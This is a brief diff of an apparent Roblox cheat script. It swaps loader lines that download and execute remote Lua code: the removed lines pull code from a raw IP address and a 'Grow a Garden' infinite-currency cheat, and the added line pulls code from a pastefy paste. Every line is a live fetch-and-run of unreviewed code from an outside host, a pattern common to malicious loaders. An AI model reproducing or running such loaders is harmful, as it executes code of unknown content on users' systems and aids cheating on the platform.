@@ -1,3 +1,1 @@
-ID="2b86c4da-5d78-4d26-85ff-979d24e92e28";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Blackhub-Infinite-Sheckles-41369"))()
+loadstring(game:HttpGet("https://pastefy.app/CeK2H2um/raw"))()
